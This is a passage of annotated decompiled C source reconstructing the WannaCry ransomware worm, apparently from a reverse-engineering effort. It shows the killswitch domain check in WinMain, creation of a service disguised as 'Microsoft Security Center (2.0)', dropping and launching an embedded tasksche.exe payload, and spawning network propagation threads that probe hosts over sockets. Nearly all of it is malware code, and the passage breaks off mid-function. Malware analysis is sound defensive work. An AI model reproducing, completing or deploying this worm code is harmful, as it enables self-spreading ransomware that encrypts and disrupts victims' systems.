              DAT_0042e67d = (undefined)local_3ff;
              iVar2 = Ordinal_19(iVar5,&DAT_0042e65c,0x60,0);
              if (iVar2 != -1) {
                iVar2 = Ordinal_16(iVar5,&stack0xfffffbe0,0x400,0);
                if (iVar2 != -1) {
                  DAT_0042e6d8 = uStack1028;
                  DAT_0042e6d9 = uStack1027;
                  DAT_0042e6dc = uVar1;
                  DAT_0042e72c = uStack1028;
                  DAT_0042e72d = uStack1027;
                  DAT_0042e730 = uVar1;
                  DAT_0042e6dd = (undefined)local_3ff;
                  DAT_0042e731 = (undefined)local_3ff;
                  iVar2 = Ordinal_19(iVar5,&DAT_0042e6bc,0x52,0);
                  if (iVar2 != -1) {
                    iVar2 = Ordinal_16(iVar5,&stack0xfffffbe0,0x400,0);
                    if ((iVar2 != -1) && (local_3ff._1_1_ == 'Q')) {
                      uVar3 = FUN_00406eb0(uStack1038,iStack1034);
                      uVar4 = FUN_00406ed0(uStack1038);
                      FUN_00406f50(iVar5,uVar3,uVar4,uStack24);
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    Ordinal_3(iVar5);
  }
  return 0;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 __cdecl FUN_00407480(undefined4 param_1) {
  int iVar1;
  undefined4 uVar2;
  undefined2 *puStack316;
  undefined4 uStack312;
  undefined4 uStack308;
  undefined4 uStack304;
  undefined4 uStack300;
  undefined2 local_120;
  undefined2 local_11e;
  undefined4 uStack284;
  undefined2 uStack280;
  undefined4 local_116;
  undefined2 local_112;
  undefined4 local_110;
  
  local_11e = 0;
  uStack280 = 0;
  local_116 = 0;
  uStack300 = 0x1bd;
  local_112 = 0;
  local_110 = 1;
  local_120 = 2;
  uStack304 = 0x4074c0;
  uStack284 = param_1;
  Ordinal_9();
  uStack304 = 6;
  uStack308 = 1;
  uStack312 = 2;
  puStack316 = (undefined2 *)0x4074cf;
  iVar1 = Ordinal_23();
  if (iVar1 == -1) {
    return 0;
  }
  puStack316 = &local_120;
  Ordinal_10(iVar1,0x8004667e);
  uStack284._0_2_ = (undefined2)iVar1;
  uStack284._2_2_ = (undefined2)((uint)iVar1 >> 0x10);
  local_120 = 1;
  local_11e = 0;
  Ordinal_4(iVar1,&puStack316,0x10);
  uVar2 = Ordinal_18(0,0,&uStack300,0,&uStack308);
  Ordinal_3(iVar1);
  return uVar2;
}

void FUN_00407620(void) {
  BOOL BVar1;
  int iVar2;
  
  iVar2 = 0;
  do {
    BVar1 = CryptAcquireContextA
                      ((HCRYPTPROV *)&phProv_0070f870,(LPCSTR)0x0,
                       (LPCSTR)(-(uint)(iVar2 != 0) & 0x4312c4),1,0xf0000000);
    if (BVar1 != 0) break;
    iVar2 = iVar2 + 1;
  } while (iVar2 < 2);
  InitializeCriticalSection((LPCRITICAL_SECTION)&lpCriticalSection_00431418);
  return;
}

int FUN_00407660(void) {
  int iVar1;
  int local_4;
  
  if (phProv_0070f870 == (HCRYPTPROV *)0x0) {
    iVar1 = rand();
    return iVar1;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)&lpCriticalSection_00431418);
  CryptGenRandom((HCRYPTPROV)phProv_0070f870,4,(BYTE *)&local_4);
  LeaveCriticalSection((LPCRITICAL_SECTION)&lpCriticalSection_00431418);
  return local_4;
}

// WARNING: Removing unreachable block (ram,0x00407797)
// WARNING: Removing unreachable block (ram,0x004077a4)
// WARNING: Removing unreachable block (ram,0x004077b3)
// WARNING: Removing unreachable block (ram,0x004077bf)
// WARNING: Removing unreachable block (ram,0x004077c3)
// WARNING: Removing unreachable block (ram,0x004077df)
// WARNING: Removing unreachable block (ram,0x004077f1)
// _StartAddress parameter of _beginthreadex
// 

undefined4 _StartAddress_00407720(void) {
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00409bc0;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  local_4 = 1;
  FUN_00409160();
  _endthreadex(0);
  FUN_004097fe((void *)0x0);
  FUN_004097fe((void *)0x0);
  *in_FS_OFFSET = local_c;
  return 0;
}

undefined4 FUN_00407a20(void) {
  uint uVar1;
  HANDLE hFile;
  DWORD nNumberOfBytesToRead;
  uint uVar2;
  int iVar3;
  int iVar4;
  DWORD *pDVar5;
  DWORD *pDVar6;
  DWORD local_c;
  DWORD *local_8 [2];
  
  local_c = 0;
  local_8[0] = (DWORD *)0x0;
  local_8[1] = (DWORD *)0x0;
  DAT_0070f864 = GlobalAlloc(0x40,(SIZE_T)&dwBytes_0050d800);
  if (DAT_0070f864 == (HGLOBAL)0x0) {
    return 0;
  }
  DAT_0070f868 = GlobalAlloc(0x40,(SIZE_T)&dwBytes_0050d800);
  if (DAT_0070f868 == (HGLOBAL)0x0) {
    GlobalFree(DAT_0070f864);
    return 0;
  }
  iVar4 = 0;
  do {
    pDVar5 = &DAT_0040b020;
    if (iVar4 != 0) {
      pDVar5 = &DAT_0040f080;
    }
    pDVar6 = (DWORD *)(&DAT_0070f864)[iVar4];
    local_8[iVar4] = pDVar6;
    uVar1 = (-(uint)(iVar4 != 0) & 0x8844) + 0x4060;
    uVar2 = uVar1 >> 2;
    while (uVar2 != 0) {
      uVar2 = uVar2 - 1;
      *pDVar6 = *pDVar5;
      pDVar5 = pDVar5 + 1;
      pDVar6 = pDVar6 + 1;
    }
    iVar3 = 0;
    while (iVar3 != 0) {
      iVar3 = iVar3 + -1;
      *(undefined *)pDVar6 = *(undefined *)pDVar5;
      pDVar5 = (DWORD *)((int)pDVar5 + 1);
      pDVar6 = (DWORD *)((int)pDVar6 + 1);
    }
    local_8[iVar4] = (DWORD *)((int)local_8[iVar4] + uVar1);
    iVar4 = iVar4 + 1;
  } while (iVar4 < 2);
  hFile = CreateFileA((LPCSTR)&executable_path,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,4,
                      (HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    GlobalFree(DAT_0070f864);
    GlobalFree(DAT_0070f868);
    return 0;
  }
  nNumberOfBytesToRead = GetFileSize(hFile,(LPDWORD)0x0);
  pDVar5 = local_8[0];
  *local_8[0] = nNumberOfBytesToRead;
  ReadFile(hFile,local_8[0] + 1,nNumberOfBytesToRead,&local_c,(LPOVERLAPPED)0x0);
  if (local_c != nNumberOfBytesToRead) {
    CloseHandle(hFile);
    GlobalFree(DAT_0070f864);
    GlobalFree(DAT_0070f868);
    return 0;
  }
  uVar1 = nNumberOfBytesToRead + 4 >> 2;
  pDVar6 = local_8[1];
  while (uVar1 != 0) {
    uVar1 = uVar1 - 1;
    *pDVar6 = *pDVar5;
    pDVar5 = pDVar5 + 1;
    pDVar6 = pDVar6 + 1;
  }
  uVar1 = nNumberOfBytesToRead + 4 & 3;
  while (uVar1 != 0) {
    uVar1 = uVar1 - 1;
    *(undefined *)pDVar6 = *(undefined *)pDVar5;
    pDVar5 = (DWORD *)((int)pDVar5 + 1);
    pDVar6 = (DWORD *)((int)pDVar6 + 1);
  }
  CloseHandle(hFile);
  return 1;
}

undefined4 FUN_00407b90(void) {
  int iVar1;
  undefined4 uVar2;
  undefined local_190 [400];
  
  iVar1 = Ordinal_115(0x202,local_190);
  if (iVar1 != 0) {
    return 0;
  }
  FUN_00407620();
  uVar2 = FUN_00407a20();
  return uVar2;
}

undefined4 FUN_00407bd0(void) {
  int iVar1;
  HANDLE hObject;
  void *_ArgList;
  
  iVar1 = FUN_00407b90();
  if (iVar1 == 0) {
    return 0;
  }
  hObject = (HANDLE)_beginthreadex((void *)0x0,0,_StartAddress_00407720,(void *)0x0,0,(uint *)0x0);
  if (hObject != (HANDLE)0x0) {
    CloseHandle(hObject);
  }
  _ArgList = (void *)0x0;
  do {
    hObject = (HANDLE)_beginthreadex((void *)0x0,0,(_StartAddress *)&_StartAddress_00407840,_ArgList
                                     ,0,(uint *)0x0);
    if (hObject != (HANDLE)0x0) {
      CloseHandle(hObject);
    }
    Sleep(2000);
    _ArgList = (void *)((int)_ArgList + 1);
  } while ((int)_ArgList < 0x80);
  return 0;
}

undefined4 FUN_00407bda(void) {
  HANDLE hObject;
  void *_ArgList;
  
  hObject = (HANDLE)_beginthreadex((void *)0x0,0,_StartAddress_00407720,(void *)0x0,0,(uint *)0x0);
  if (hObject != (HANDLE)0x0) {
    CloseHandle(hObject);
  }
  _ArgList = (void *)0x0;
  do {
    hObject = (HANDLE)_beginthreadex((void *)0x0,0,(_StartAddress *)&_StartAddress_00407840,_ArgList
                                     ,0,(uint *)0x0);
    if (hObject != (HANDLE)0x0) {
      CloseHandle(hObject);
    }
    Sleep(2000);
    _ArgList = (void *)((int)_ArgList + 1);
  } while ((int)_ArgList < 0x80);
  return 0;
}

void create_wannacry_service() {
  SC_HANDLE hSCManager;
  SC_HANDLE hService;
  char exec_with_args [260];
  
  // C:\Austin\Desktop\wannacry.exe -m security
  sprintf(exec_with_args,s__s__m_security_00431330,&executable_path);
  hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
  if (hSCManager != (SC_HANDLE)0x0) {
    hService = CreateServiceA(hSCManager,s_mssecsvc2_0_004312fc,
                              s_Microsoft_Security_Center__2_0__S_00431308,0xf01ff,0x10,2,1,
                              exec_with_args,(LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,
                              (LPCSTR)0x0);
    if (hService != (SC_HANDLE)0x0) {
      StartServiceA(hService,0,(LPCSTR *)0x0);
      CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCManager);
    return 0;
  }
  return 0;
}

undefined4 write_1831_to_taskche_exe(void) {
  char cVar1;
  HMODULE hModule;
  HRSRC res1831_info;
  HGLOBAL res1831_handle;
  DWORD res1831_size;
  HANDLE createdFileHandle;
  BOOL BVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  undefined **ppuVar6;
  LPSTR *ppCVar7;
  undefined **ppuVar8;
  char *pcVar9;
  char *pcVar10;
  undefined4 *puVar11;
  HANDLE hObject;
  _PROCESS_INFORMATION res1831_locked;
  _STARTUPINFOA _Stack592;
  char acStack524 [4];
  CHAR taskche_path;
  undefined4 unkown_buffer_nulled [64];
  CHAR qeriu_path;
  undefined4 unkown_buffer2_nulled [64];
  
  //get handle to kernel32.dll
  hModule = GetModuleHandleW(u_kernel32_dll_004313b4);
  if (hModule != (HMODULE)0x0) {
    createProcessA = (CreateProcessA *)GetProcAddress(hModule,s_CreateProcessA_004313a4);
    createFileA = (CreateFileA *)GetProcAddress(hModule,s_CreateFileA_00431398);
    writeFile = (WriteFile *)GetProcAddress(hModule,s_WriteFile_0043138c);
    closeHandle = (CloseHandle *)GetProcAddress(hModule,s_CloseHandle_00431380);
    if ((((createProcessA != (CreateProcessA *)0x0) && (createFileA != (CreateFileA *)0x0)) &&
        (writeFile != (WriteFile *)0x0)) && (closeHandle != (CloseHandle *)0x0)) {
      res1831_info = FindResourceA((HMODULE)0x0,(LPCSTR)1831,&DAT_0043137c);
      if (res1831_info != (HRSRC)0x0) {
        res1831_handle = LoadResource((HMODULE)0x0,res1831_info);
        if (res1831_handle != (HGLOBAL)0x0) {
          res1831_locked.hProcess = LockResource(res1831_handle);
          if (res1831_locked.hProcess != (LPVOID)0x0) {
            res1831_size = SizeofResource((HMODULE)0x0,res1831_info);
            if (res1831_size != 0) {
              iVar3 = 0x40;
              taskche_path = '\0';
              puVar11 = &unkown_buffer_nulled;
              
              //memset(puVar11, 0, 0x40/64);
              
              while (iVar3 != 0) {
                iVar3 = iVar3 + -1;
                *puVar11 = 0;
                puVar11 = puVar11 + 1;
              }

              *(undefined2 *)puVar11 = 0;
              *(undefined *)((int)puVar11 + 2) = 0;
              iVar3 = 0x40;
              qeriu_path = '\0';
              puVar11 = &unkown_buffer2_nulled;

              // memset(puVar11, 0, 0x40/64);
              
              while (iVar3 != 0) {
                iVar3 = iVar3 + -1;
                *puVar11 = 0;
                puVar11 = puVar11 + 1;
              }

              *(undefined2 *)puVar11 = 0;
              *(undefined *)((int)puVar11 + 2) = 0;
              
              // C:\WINDOWS\taskche.exe
              sprintf(&taskche_path, s_C___s__s_00431358, s_WINDOWS_00431364, s_tasksche_exe_0043136c);
              
              // C:\Windows\qeriuwjhrf
              sprintf(&qeriu_path, s_C___s_qeriuwjhrf_00431344, s_WINDOWS_00431364);
              
              MoveFileExA(&taskche_path,&qeriu_path, 1);
              createdFileHandle = (*createFileA)(&taskche_path, 0x40000000, 0, (LPSECURITY_ATTRIBUTES)0x0, 2, 4,(HANDLE)0x0);
              if (createdFileHandle != (HANDLE)0xffffffff) {
                (*writeFile)(createdFileHandle, res1831_locked.hProcess, res1831_size, (LPDWORD)&res1831_locked, (LPOVERLAPPED)0x0);
                (*closeHandle)(createdFileHandle);
                res1831_locked.hThread = (HANDLE)0x0;
                res1831_locked.dwProcessId = 0;
                res1831_locked.dwThreadId = 0;
                iVar3 = 0x10;
                ppCVar7 = &_Stack592.lpReserved;
                
                //strcat(tasksche_path, "/i");
                while (iVar3 != 0) {
                  iVar3 = iVar3 + -1;
                  *ppCVar7 = (LPSTR)0x0;
                  ppCVar7 = ppCVar7 + 1;
                }
                
                uVar4 = 0xffffffff;
                ppuVar6 = &PTR_DAT_00431340;
                
                do {
                  ppuVar8 = ppuVar6;
                  if (uVar4 == 0) break;
                  uVar4 = uVar4 - 1;
                  ppuVar8 = (undefined **)((int)ppuVar6 + 1);
                  cVar1 = *(char *)ppuVar6;
                  ppuVar6 = ppuVar8;
                } while (cVar1 != '\0');
                
                uVar4 = ~uVar4;
                res1831_locked.hProcess = (HANDLE)0x0;
                iVar3 = -1;
                pcVar9 = acStack524;

                do {
                  pcVar10 = pcVar9;
                  if (iVar3 == 0) break;
                  iVar3 = iVar3 + -1;
                  pcVar10 = pcVar9 + 1;
                  cVar1 = *pcVar9;
                  pcVar9 = pcVar10;
                } while (cVar1 != '\0');
                
                uVar5 = uVar4 >> 2;
                ppuVar6 = (undefined **)((int)ppuVar8 - uVar4);
                puVar11 = (undefined4 *)(pcVar10 + -1);
                
                while (uVar5 != 0) {
                  uVar5 = uVar5 - 1;
                  *(undefined **)puVar11 = *ppuVar6;
                  ppuVar6 = ppuVar6 + 1;
                  puVar11 = puVar11 + 1;
                }
                
                uVar4 = uVar4 & 3;
                
                while (uVar4 != 0) {
                  uVar4 = uVar4 - 1;
                  *(undefined *)puVar11 = *(undefined *)ppuVar6;
                  ppuVar6 = (undefined **)((int)ppuVar6 + 1);
                  puVar11 = (undefined4 *)((int)puVar11 + 1);
                }

                hObject = (HANDLE)0x0;
                createdFileHandle = (HANDLE)0x0;
                _Stack592.cb = 0x44;
                _Stack592.wShowWindow = 0;
                _Stack592.dwFlags = 0x81;
                
                BVar2 = (*createProcessA)((LPCSTR)0x0, acStack524, (LPSECURITY_ATTRIBUTES)0x0,
                                          (LPSECURITY_ATTRIBUTES)0x0, 0, 0x8000000, (LPVOID)0x0,
                                          (LPCSTR)0x0, (LPSTARTUPINFOA)&_Stack592, (LPPROCESS_INFORMATION)&res1831_locked);
                
                if (BVar2 != 0) {
                  (*closeHandle)(hObject);
                  (*closeHandle)(createdFileHandle);
                }
              }
            }
          }
        }
      }
    }
  }
  return 0;
}

unsigned int no_argument_handler(void) {
  create_wannacry_service();
  write_1831_to_taskche_exe();
  return 0;
}

void __cdecl FUN_00407fa0(SC_HANDLE param_1,int param_2) {
  undefined4 local_1c;
  int local_18;
  undefined4 local_14;
  undefined *local_10;
  undefined *local_c;
  uint local_8;
  undefined4 *local_4;
  
  local_4 = &local_1c;
  local_1c = 1;
  local_14 = 0;
  local_18 = param_2 * 1000;
  local_8 = (uint)(param_2 != -1);
  local_c = &DAT_0070f87c;
  local_10 = &DAT_0070f87c;
  ChangeServiceConfig2A(param_1,2,&local_14);
  return;
}

void wannacry_real_entry(void) {
  int *argc;
  SC_HANDLE hSCManager;
  SC_HANDLE hSCObject;
  SERVICE_TABLE_ENTRYA SStack16;
  undefined4 uStack8;
  undefined4 uStack4;
  
  GetModuleFileNameA((HMODULE)0x0, (LPSTR)&executable_path, 0x104);
  argc = (int *)__p___argc();
  
  if (*argc < 2) {
    no_argument_handler();
    return;
  }

  hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
  if (hSCManager != (SC_HANDLE)0x0) {
    //s_mssecsvc2_0_004312fc = "mssecsvc2.0"
    hSCObject = OpenServiceA(hSCManager,s_mssecsvc2_0_004312fc,0xf01ff);
    if (hSCObject != (SC_HANDLE)0x0) {
      FUN_00407fa0(hSCObject,0x3c);
      CloseServiceHandle(hSCObject);
    }
    CloseServiceHandle(hSCManager);
  }

  SStack16.lpServiceName = s_mssecsvc2_0_004312fc;
  SStack16.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)&LAB_00408000;
  uStack8 = 0;
  uStack4 = 0;
  StartServiceCtrlDispatcherA(&SStack16);
  
  return;
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
  HINTERNET hInternet;
  HINTERNET hinternet_return;
  int i;
  char *killswitch_url;
  char *killswitch_url_copy;
  char killswitch_url_buffer [57];
  
  i = 14;
  //killswitch_url = s_http___www_iuqerfsodp9ifjaposdfj_004313d0;
  killswitch_url = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";

  killswitch_url_copy = killswitch_url_buffer;
  
  //strncpy(killswitch_url_copy, killswitch_url, 14);
  while (i != 0) {
    i = i + -1;
    *(undefined4 *)killswitch_url_copy = *(undefined4 *)killswitch_url;
    killswitch_url = killswitch_url + 4;
    killswitch_url_copy = killswitch_url_copy + 4;
  }

  *killswitch_url_copy = *killswitch_url;
  InternetOpenA((LPCSTR)0x0, 1, (LPCSTR)0x0, (LPCSTR)0x0, 0);
  hinternet_return = InternetOpenUrlA(hInternet, killswitch_url_buffer, (LPCSTR)0x0, 0, 0x84000000, 0);

  //if url request fails
  if (hinternet_return == (HINTERNET)0x0) {
    InternetCloseHandle(hInternet);
    InternetCloseHandle(0);
    wannacry_real_entry();
    return 0;
  }

  InternetCloseHandle(hInternet);
  InternetCloseHandle(hinternet_return);

  return 0;
}

undefined * __thiscall FUN_00408200(void *this,undefined *param_1,undefined *param_2) {
  void *pvVar1;
  undefined4 *puVar2;
  
  *(undefined *)this = *param_2;
  *(undefined *)((int)this + 1) = *param_1;
  *(undefined *)((int)this + 8) = 0;
  puVar2 = (undefined4 *)operator_new(0x18);
  puVar2[1] = 0;
  puVar2[5] = 1;
  _Lockit((_Lockit *)&param_2);
  
  if (DAT_0070f878 == (undefined4 *)0x0) {
    DAT_0070f878 = puVar2;
    *puVar2 = 0;
    puVar2 = (undefined4 *)0x0;
    DAT_0070f878[2] = 0;
  }

  DAT_0070f874 = DAT_0070f874 + 1;
  __Lockit((_Lockit *)&param_2);
  
  if (puVar2 != (undefined4 *)0x0) {
    FUN_004097fe(puVar2);
  }
  
  puVar2 = DAT_0070f878;
  pvVar1 = operator_new(0x18);
  *(undefined4 **)((int)pvVar1 + 4) = puVar2;
  *(undefined4 *)((int)pvVar1 + 0x14) = 0;
  *(void **)((int)this + 4) = pvVar1;
  *(undefined4 *)((int)this + 0xc) = 0;
  *(void **)pvVar1 = pvVar1;
  *(int *)(*(int *)((int)this + 4) + 8) = *(int *)((int)this + 4);
  
  return (undefined *)this;
}

void __thiscall FUN_004082b0(void *this,undefined4 *param_1) {
  *param_1 = **(undefined4 **)((int)this + 4);
  return;
}

void __thiscall FUN_004082c0(void *this,int **param_1,int **param_2,int **param_3) {
  int *piVar1;
  int **ppiVar2;
  int **ppiVar3;
  int *piVar4;
  int **ppiVar5;
  
  ppiVar2 = param_3;
  if (((*(int *)((int)this + 0xc) != 0) &&
      (ppiVar5 = *(int ***)((int)this + 4), param_2 == (int **)*ppiVar5)) && (param_3 == ppiVar5)) {
    piVar4 = ppiVar5[1];

    if (ppiVar5[1] != DAT_0070f878) {
      do {
        FUN_004089d0((int *)piVar4[2]);
        piVar1 = (int *)*piVar4;
        FUN_004097fe(piVar4);
        piVar4 = piVar1;
      } while (piVar1 != DAT_0070f878);
    }

    *(int **)(*(int *)((int)this + 4) + 4) = DAT_0070f878;
    *(undefined4 *)((int)this + 0xc) = 0;
    *(undefined4 *)*(undefined4 *)((int)this + 4) = *(undefined4 *)((int)this + 4);
    *(int *)(*(int *)((int)this + 4) + 8) = *(int *)((int)this + 4);
    *param_1 = **(int ***)((int)this + 4);
    
    return;
  }
  
  ppiVar5 = param_2;
  if (param_2 != param_3) {
    do {
      if (ppiVar5[2] == DAT_0070f878) {
        ppiVar3 = (int **)ppiVar5[1];
        param_2 = ppiVar5;
        if (ppiVar5 == (int **)ppiVar3[2]) {
          do {
            param_2 = ppiVar3;
            ppiVar3 = (int **)param_2[1];
          } while (param_2 == (int **)ppiVar3[2]);
        }
        if ((int **)param_2[2] != ppiVar3) goto LAB_0040836e;
      } else {
        ppiVar3 = (int **)FUN_00408d30(ppiVar5[2]);
LAB_0040836e:
        param_2 = ppiVar3;
      }
      FUN_004085d0(this,(int **)&param_3,ppiVar5);
      ppiVar5 = param_2;
    } while (param_2 != ppiVar2);
  }
  
  *(int ***)param_1 = param_2;
  return;
}

void __thiscall FUN_00408390(void *this,int **param_1,int **param_2) {
  int **ppiVar1;
  int *piVar2;
  bool bVar3;
  int **ppiVar4;
  int **ppiVar5;
  int **ppiVar6;
  int **local_4;
  
  ppiVar4 = param_2;
  bVar3 = true;
  ppiVar5 = *(int ***)((int)this + 4);
  ppiVar6 = ppiVar5;
  ppiVar1 = (int **)ppiVar5[1];
  while (ppiVar1 != DAT_0070f878) {
    bVar3 = (int)*param_2 < (int)ppiVar1[3];
    ppiVar6 = ppiVar1;
    if (bVar3) {
      ppiVar1 = (int **)*ppiVar1;
    } else {
      ppiVar1 = (int **)ppiVar1[2];
    }
  }
  if (*(char *)((int)this + 8) == '\0') {
    local_4 = ppiVar6;
    if (bVar3) {
      if (ppiVar6 == (int **)*ppiVar5) {
        ppiVar5 = (int **)FUN_00408a60(this,(int **)&param_2,(int *)ppiVar1,ppiVar6,(int *)param_2);
        *param_1 = *ppiVar5;
        *(undefined *)(param_1 + 1) = 1;
        return;
      }
      FUN_00408dd0((int **)&local_4);
    }
    if ((int)local_4[3] < (int)*ppiVar4) {
      ppiVar5 = (int **)FUN_00408a60(this,(int **)&param_2,(int *)ppiVar1,ppiVar6,(int *)ppiVar4);
      *param_1 = *ppiVar5;
      *(undefined *)(param_1 + 1) = 1;
    
      return;
    }
    *(int ***)param_1 = local_4;
    *(undefined *)(param_1 + 1) = 0;
    
    return;
  }

  local_4 = (int **)this;
  param_2 = (int **)FUN_00408db0(ppiVar6,0);
  *(int ***)param_2 = DAT_0070f878;
  *(int ***)(param_2 + 2) = DAT_0070f878;
  FUN_00408e30(param_2 + 3,ppiVar4);
  ppiVar5 = param_2;
  *(int *)((int)this + 0xc) = *(int *)((int)this + 0xc) + 1;
  if (((ppiVar6 == *(int ***)((int)this + 4)) || (ppiVar1 != DAT_0070f878)) ||
     ((int)*ppiVar4 < (int)ppiVar6[3])) {
    *(int ***)ppiVar6 = param_2;
    ppiVar1 = *(int ***)((int)this + 4);
    if (ppiVar6 == ppiVar1) {
      *(int ***)(ppiVar1 + 1) = param_2;
      *(int ***)(*(int *)((int)this + 4) + 8) = param_2;
    } else {
      if (ppiVar6 == (int **)*ppiVar1) {
        *(int ***)ppiVar1 = param_2;
      }
    }
  } else {
    *(int ***)(ppiVar6 + 2) = param_2;
    if (ppiVar6 == *(int ***)(*(int *)((int)this + 4) + 8)) {
      *(int ***)(*(int *)((int)this + 4) + 8) = param_2;
    }
  }
  ppiVar6 = param_2;
  if (param_2 != *(int ***)(*(int *)((int)this + 4) + 4)) {
    do {
      ppiVar1 = (int **)ppiVar6[1];
      if (ppiVar1[5] != (int *)0x0) break;
      piVar2 = (int *)*ppiVar1[1];
      if (ppiVar1 == (int **)piVar2) {
        piVar2 = (int *)ppiVar1[1][2];
        if (piVar2[5] == 0) {
          ppiVar1[5] = (int *)0x1;
          piVar2[5] = 1;
          *(undefined4 *)(ppiVar6[1][1] + 0x14) = 0;
          ppiVar6 = (int **)ppiVar6[1][1];
        } else {
          if (ppiVar6 == (int **)ppiVar1[2]) {
            FUN_00408cd0(this,(int *)ppiVar1);
            ppiVar6 = ppiVar1;
          }
          ppiVar6[1][5] = 1;
          *(undefined4 *)(ppiVar6[1][1] + 0x14) = 0;
          FUN_00408d50(this,(int *)ppiVar6[1][1]);
        }
      } else {
        if (piVar2[5] == 0) {
          ppiVar1[5] = (int *)0x1;
          piVar2[5] = 1;
          *(undefined4 *)(ppiVar6[1][1] + 0x14) = 0;
          ppiVar6 = (int **)ppiVar6[1][1];
        } else {
          if (ppiVar6 == (int **)*ppiVar1) {
            FUN_00408d50(this,(int *)ppiVar1);
            ppiVar6 = ppiVar1;
          }
          ppiVar6[1][5] = 1;
          *(undefined4 *)(ppiVar6[1][1] + 0x14) = 0;
          FUN_00408cd0(this,(int *)ppiVar6[1][1]);
        }
      }
    } while (ppiVar6 != *(int ***)(*(int *)((int)this + 4) + 4));
  }

  *(undefined4 *)(*(int *)(*(int *)((int)this + 4) + 4) + 0x14) = 1;
  *(int ***)param_1 = ppiVar5;
  *(undefined *)(param_1 + 1) = 1;
  return;
}

void __thiscall FUN_004085d0(void *this,int **param_1,int **param_2) {
  int *piVar1;
  int iVar2;
  int *piVar3;
  int **ppiVar4;
  int **ppiVar5;
  int **ppiVar6;
  int **ppiVar7;
  int **ppiVar8;
  int **ppiVar9;
  int **local_c;
  _Lockit local_4 [4];
  
  ppiVar5 = param_2;
  FUN_00408a10((int *)&param_2);
  ppiVar9 = (int **)*ppiVar5;
  ppiVar7 = ppiVar5 + 2;
  local_c = ppiVar5;
  ppiVar8 = ppiVar7;
  if (ppiVar9 == DAT_0070f878) {
    ppiVar9 = (int **)*ppiVar7;
  } else {
    ppiVar6 = (int **)*ppiVar7;
    if (ppiVar6 != DAT_0070f878) {
      local_c = ppiVar6;
      ppiVar8 = (int **)*ppiVar6;
      while (ppiVar8 != DAT_0070f878) {
        local_c = ppiVar8;
        ppiVar8 = (int **)*ppiVar8;
      }
      ppiVar9 = (int **)local_c[2];
      ppiVar8 = local_c + 2;
    }
  }
  
  ppiVar6 = local_c;
  _Lockit(local_4);
  
  if (local_c == ppiVar5) {
    ppiVar9[1] = local_c[1];
    if (*(int ***)(*(int *)((int)this + 4) + 4) == ppiVar5) {
      *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar9;
    } else {
      ppiVar8 = (int **)ppiVar5[1];
      if ((int **)*ppiVar8 == ppiVar5) {
        *(int ***)ppiVar8 = ppiVar9;
      } else {
        *(int ***)(ppiVar8 + 2) = ppiVar9;
      }
    }

    ppiVar8 = *(int ***)((int)this + 4);
    
    if ((int **)*ppiVar8 == ppiVar5) {
      if ((int **)*ppiVar7 == DAT_0070f878) {
        *ppiVar8 = ppiVar5[1];
      } else {
        ppiVar6 = (int **)*ppiVar9;
        ppiVar7 = ppiVar9;
        while (ppiVar4 = ppiVar6, ppiVar4 != DAT_0070f878) {
          ppiVar6 = (int **)*ppiVar4;
          ppiVar7 = ppiVar4;
        }
        *(int ***)ppiVar8 = ppiVar7;
      }
    }
    if (*(int ***)(*(int *)((int)this + 4) + 8) == ppiVar5) {
      if ((int **)*ppiVar5 == DAT_0070f878) {
        ppiVar7 = (int **)ppiVar5[1];
      } else {
        ppiVar8 = (int **)ppiVar9[2];
        ppiVar7 = ppiVar9;
        while (ppiVar5 = ppiVar8, ppiVar5 != DAT_0070f878) {
          ppiVar8 = (int **)ppiVar5[2];
          ppiVar7 = ppiVar5;
        }
      }
      *(int ***)(*(int *)((int)this + 4) + 8) = ppiVar7;
    }
  } else {
    *(int ***)(*ppiVar5 + 1) = local_c;
    *local_c = *ppiVar5;
    
    if (local_c == (int **)*ppiVar7) {
      *(int ***)(ppiVar9 + 1) = local_c;
    } else {
      ppiVar9[1] = local_c[1];
      *(int ***)local_c[1] = ppiVar9;
      *ppiVar8 = *ppiVar7;
      *(int ***)(*ppiVar7 + 1) = local_c;
    }
    
    if (*(int ***)(*(int *)((int)this + 4) + 4) == ppiVar5) {
      *(int ***)(*(int *)((int)this + 4) + 4) = local_c;
    } else {
      ppiVar7 = (int **)ppiVar5[1];
      if ((int **)*ppiVar7 == ppiVar5) {
        *(int ***)ppiVar7 = local_c;
      } else {
        *(int ***)(ppiVar7 + 2) = local_c;
      }
    }
    local_c = ppiVar5;
    ppiVar6[1] = ppiVar5[1];
    piVar1 = ppiVar6[5];
    ppiVar6[5] = ppiVar5[5];
    ppiVar5[5] = piVar1;
  }
  if (local_c[5] == (int *)0x1) {
    if (ppiVar9 != *(int ***)(*(int *)((int)this + 4) + 4)) {
      do {
        if (ppiVar9[5] != (int *)0x1) break;
        ppiVar7 = (int **)*ppiVar9[1];
        if (ppiVar9 == ppiVar7) {
          ppiVar7 = (int **)ppiVar9[1][2];
          if (ppiVar7[5] == (int *)0x0) {
            ppiVar7[5] = (int *)0x1;
            ppiVar9[1][5] = 0;
            piVar1 = ppiVar9[1];
            ppiVar7 = (int **)piVar1[2];
            *(int **)(piVar1 + 2) = *ppiVar7;
            if ((int **)*ppiVar7 != DAT_0070f878) {
              *(int **)(*ppiVar7 + 1) = piVar1;
            }
            ppiVar7[1] = (int *)piVar1[1];
            if (piVar1 == (int *)*(int *)(*(int *)((int)this + 4) + 4)) {
              *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar7;
            } else {
              ppiVar8 = (int **)piVar1[1];
              if (piVar1 == *ppiVar8) {
